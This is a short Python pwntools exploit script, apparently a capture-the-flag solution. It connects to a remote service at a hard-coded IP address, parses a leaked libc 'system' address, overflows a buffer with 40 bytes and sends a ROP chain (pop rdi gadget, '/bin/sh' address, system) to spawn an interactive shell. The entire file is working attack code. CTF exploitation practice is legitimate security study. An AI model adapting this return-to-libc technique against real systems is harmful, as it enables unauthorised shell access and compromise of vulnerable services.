from pwn import *

p = remote("128.199.12.141", 7001)

leak = p.recvuntil(b',')
system = p64(int(leak[-15:-1].decode(), 16))

buf = b'A'*40

bin_sh = p64(0x402008)

rdi_ret = p64(0x40122b)

p.sendline(buf + rdi_ret + bin_sh + system)

p.interactive()
